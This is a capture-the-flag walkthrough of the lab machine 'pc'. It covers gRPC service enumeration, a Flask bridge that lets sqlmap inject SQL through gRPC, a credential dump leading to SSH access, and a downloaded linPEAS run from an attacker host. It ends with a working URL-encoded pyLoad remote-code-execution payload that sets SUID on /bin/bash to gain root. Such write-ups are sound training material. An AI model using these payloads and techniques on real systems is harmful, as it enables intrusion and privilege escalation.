# pc

| Hostname   | Difficulty |
| ---        | ---        |
| pc         | Easy       |

Machine IP: 10.10.10.xx :

```bash
TARGET=10.10.11.214       # pc IP address
ATTACKER=10.10.14.13     # attacker IP
```

## Initial Reconnaissance

### Ports and services

```shell
nmap $TARGET -p- 
```

Result:

```text
Nmap scan report for 10.10.11.214
Host is up (0.018s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 104.41 seconds
```

```shell
nmap $TARGET -p 22,50051 -sC -sV
```

Result:

```text
Nmap scan report for 10.10.11.214
Host is up (0.019s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=6/4%Time=647CE910%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
```

### Port 50051

Port 50051 is not identified by nmap. After some reseach, this port is commonly associated with gRPC (Google Remote Procedure Call) services. gRPC is a high-performance, open-source framework developed by Google that allows communication between different applications and services.

gRPC uses the HTTP/2 protocol and supports multiple programming languages, making it an efficient and flexible choice for building distributed systems. It is often used for inter-service communication in microservices architectures and for building client-server applications.

Therefore, it's possible that a service utilizing gRPC could be listening on port 50051. However, without more information, it's difficult to determine the exact service running on that port.

## Initial access

### Exploitation

Googling for "grpc linux client" lead to a client :

https://github.com/vadimi/grpc-client-cli

Install it :

```shell
go install github.com/vadimi/grpc-client-cli/cmd/grpc-client-cli@latest
```

And use this client against the service :

```shell
grpc-client-cli 10.10.11.214:50051
```

This allow to anumerate this gRPC service :

```text
? Choose a service:  [Use arrows to move, type to filter]
→ grpc.reflection.v1alpha.ServerReflection
  SimpleApp
```

The service "grpc.reflection.v1alpha.ServerReflection" have a method :

```text
Choose a method: ServerReflectionInfo
Message json (type ? to see defaults): ?
{"host":""}
```

The service "SimpleApp" have some methods :

```text
  getInfo
  LoginUser
  RegisterUser
```

We can check theses method :

```text
? Choose a method: RegisterUser
Message json (type ? to see defaults): ?
{"username":"","password":""}
Message json (type ? to see defaults): {"username":"admin","password":"admin"}
{
  "message": "User Already Exists!!"
}
```


```text
? Choose a method: getInfo
Message json (type ? to see defaults): ?
{"id":""}
Message json (type ? to see defaults): {"id":"1"}
{
  "message": "Authorization Error.Missing 'token' header"
}
```


```text
? Choose a method: LoginUser
Message json (type ? to see defaults): ?
{"username":"","password":""}
Message json (type ? to see defaults): {"username":"admin","password":"admin"}
{
  "message": "Your id is 518."
}
```

We have guessed a credential on this service : admin / admin

The returned id seems random.

We can also create a new user :

```text
? Choose a method: RegisterUser
Message json (type ? to see defaults): ?
{"username":"","password":""}
Message json (type ? to see defaults): {"username":"john","password":"doe"}
{
  "message": "username or password must be greater than 4"
}
Message json (type ? to see defaults): {"username":"johndoe","password":"password"}
{
  "message": "Account created for user johndoe!"
}
```

Searching again on internet, we can find a curl-like client for gRPC :

https://github.com/fullstorydev/grpcurl

downaload and uncompress it :

```shell
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.7/grpcurl_1.8.7_linux_x86_64.tar.gz
tar xvf grpcurl_1.8.7_linux_x86_64.tar.gz
```

Then call the loginUser method :

```shell
./grpcurl -plaintext -d '{"username":"admin","password":"admin"}' 10.10.11.214:50051 SimpleApp/LoginUser
```

output :

```text
{
  "message": "Your id is 131."
}
```

We can also register a user :

```shell
./grpcurl -vv -plaintext -d '{"username":"admin1","password":"admin1"}' 10.10.11.214:50051 SimpleApp/RegisterUser
```

and then login :

```shell
./grpcurl -vv -plaintext -d '{"username":"admin1","password":"admin1"}' 10.10.11.214:50051 SimpleApp/LoginUser   
```

output :

```text
Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
{
  "message": "Your id is 299."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xIiwiZXhwIjoxNjg2MDg4NzkwfQ.zB9sHzF8n0xLU-kuAvrrBx6IpH9gclGROk6KvrEF-U0'
Sent 1 request and received 1 response
```

We can try get a user info :

```shell
./grpcurl -vv -plaintext -d '{"id":"299"}' 10.10.11.214:50051 SimpleApp/getInfo
```

output :

```text
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 44 bytes

Response contents:
{
  "message": "Authorization Error.Missing 'token' header"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

So we have to provide the token back : 

```shell
./grpcurl -vv -plaintext -d '{"id":"299"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xIiwiZXhwIjoxNjg2MDg4NzkwfQ.zB9sHzF8n0xLU-kuAvrrBx6IpH9gclGROk6KvrEF-U0' 10.10.11.214:50051 SimpleApp/getInfo
```

output:

```text
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xIiwiZXhwIjoxNjg2MDg4NzkwfQ.zB9sHzF8n0xLU-kuAvrrBx6IpH9gclGROk6KvrEF-U0

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 19 bytes

Response contents:
{
  "message": "Will update soon."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

This getInfo method with `id` parameter seems to be vulnerable to a SQL Injection. When using `'{"id":"802; select *"}'`, we have an answer :

```text
ERROR:
  Code: Unknown
  Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
```

Using SQLmap would require to have an HTTP service, but gRPC works on HTTP/2 protocol. We need to adapt these protocol with a bridge.

We write a bridge that provide a HTTP interface over the calls tp grpcurl :

```python
#!/usr/bin/python3

# pip install flask
# flask --app grpc-bridge run


from flask import Flask
from flask import request
import json, subprocess

targetHost="10.10.11.214:50051"
serviceName="SimpleApp"

userToken = None

def callRpc( method, dataJson ):
    global userToken
    # ./grpcurl -plaintext -d '{"id":"299"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4xIiwiZXhwIjoxNjg2MDg4NzkwfQ.zB9sHzF8n0xLU-kuAvrrBx6IpH9gclGROk6KvrEF-U0' 10.10.11.214:50051 SimpleApp/getInfo

    # ./grpcurl -plaintext -d '<JSON data>' -H 'token: <token>' <host>:<port> <serviceName>/<method>

    command = ['./grpcurl', '-v', '--plaintext', '-d', dataJson ]

    if userToken :
      print("with token")
      command.append( "-H")
      command.append( "token: " + userToken )
    
    command.append( targetHost )
    command.append( "{}/{}".format(serviceName,method) )

    print( " ".join( command ) )

    result = subprocess.run( command, capture_output=True, text=True )
    #print("stdout:", result.stdout)
    if result.stderr:
        print("stderr:", result.stderr)
        return result.stderr

    outStr = ""

    # index to trigger between sections
    # 0 : begining, before content
    # 1 : in content
    # 2 : after content, before trailers
    # 3 : in trailers
    # 4 : after trailers
    index = 0
    for line in result.stdout.splitlines():
   
      if index == 0 and (line.startswith('Response contents:')):
        # this is the centent header
        print( line )
        index=1
    
      elif index == 1:
        if line == "":
          # this is the end of centent
          index = 2
        else:
          outStr += line
      elif index == 2 and (line.startswith('Response trailers received:')) :
        index = 3
      elif index == 3 and (line.startswith('token: b')) :
        print( line )
        # we have the token => collect it
        userToken = line.split("'")[1]
        print( "Token : " + userToken )
        
      elif index == 3 :
        index = 4

    #print( outStr )
    print( result.stdout )
    # replace '\"' by '"'
    return result.stdout.encode('raw_unicode_escape').decode('unicode_escape') #outStr



def callRpc_service_getInfo( id ):
  return callRpc("getInfo", '{"id": "' + id + '"}' )



def callRpc_service_LoginUser( username, password ):
  return callRpc("LoginUser", json.dumps({"username":username,"password":password}) )

  

def callRpc_service_RegisterUser( username, password ):
  return callRpc("RegisterUser", json.dumps({"username":username,"password":password} ) )
  


#print("[ ] Init: Register User")
#callRpc_service_RegisterUser("admin1","password1")

print("[ ] Init: Login User")
#callRpc_service_LoginUser("admin1","password1")

callRpc_service_LoginUser("admin","admin")

print("[ ] Start Service")

app = Flask(__name__)

@app.route("/")
def call_rpc():
  #print( )
  return callRpc_service_getInfo( request.args.get('id') )
  # return "Hello, World!"
```

Execute this bridge with :

```shell
flask --app grpc-bridge run
```

This bridge is available on local port 5000, so we can use sqlmap :

```shell
sqlmap --dbms=SQLite -p id -u "http://127.0.0.1:5000?id=692" --dump --batch   
```

We have some dumped datas :

```text
Database: <current>
Table: messages
[1 entry]
+-----+-------------------+----------+
| id  | message           | username |
+-----+-------------------+----------+
| 405 | Will update soon. | admin    |
+-----+-------------------+----------+
```


```text
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

We can get a shell using this credential on SSH:

```shell
ssh sau@10.10.11.214
```

## Post-Exploitation

### Host Reconnaissance

For a quick reconnaissance, we can use linPEAS. Using `updog`, upload it to the target host :

```shell
cd /tmp
wget http://10.10.14.7:9090/linpeas.sh
```

and execute :

```shell
bash ./linpeas.sh
```

There is a possible kernel exploit : CVE-2021-3560. This is a Polkit-Privilege-Esclation

There is also an application listening on local port 8000. This can be verified with `netstat`:

```shell
$ netstat -4tlp
```

```text
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -
```

we can read that port to identify the application :

```shell
curl -L http://localhost:8000
```

```html
<title>Login - pyLoad </title>
```

### Privilege Escalation

Searching for a vulnerability on pyload, we can find :

https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/

> An unauthenticated attacker can execute arbitrary python code by abusing js2py functionality.
> Also, due to the lack of CSRF protection, a victim can be tricked to execute arbitrary python code

A proof of concept is provided :

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

The payload `pyimport os;os.system("touch /tmp/pwnd")` is URL-encoded to `%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29`

From out attacker host, we can connect directly to this application with a port forwarding on the SSH sesion :

```shell
ssh sau@10.10.11.214 -N
```

For our purpose, we will use the payload `pyimport os;os.system("chmod u+s /bin/bash")`, that encode into `%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29`

We can remove somr useless options to get the final exploit :

```shell
curl -i -s -k -X POST --data-binary 'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&passwords=aaaa' http://127.0.0.1:8000/flash/addcrypted2
```

We can check :

```shell
$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

And exploit to get a root access :

```shell
sau@pc:~$ /bin/bash -p
bash-5.0# id
uid=1001(sau) gid=1001(sau) euid=0(root) groups=1001(sau)
bash-5.0#
```
